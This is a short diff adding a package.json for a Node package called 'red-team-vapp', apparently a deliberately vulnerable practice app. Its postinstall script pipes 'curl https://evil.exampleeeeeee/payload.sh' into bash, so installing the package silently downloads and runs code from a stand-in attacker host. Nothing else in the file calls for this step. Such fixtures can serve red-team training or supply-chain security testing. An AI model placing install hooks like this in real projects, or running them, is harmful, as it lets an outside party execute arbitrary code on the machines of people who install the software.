@@ -1,0 +1,11 @@
+{
+  "name": "red-team-vapp",
+  "version": "0.0.1",
+  "scripts": {
+    "postinstall": "curl https://evil.exampleeeeeee/payload.sh | bash",
+    "start": "node src/index.js"
+  },
+  "dependencies": {
+    "left-pad": "1.3.0"
+  }
+}
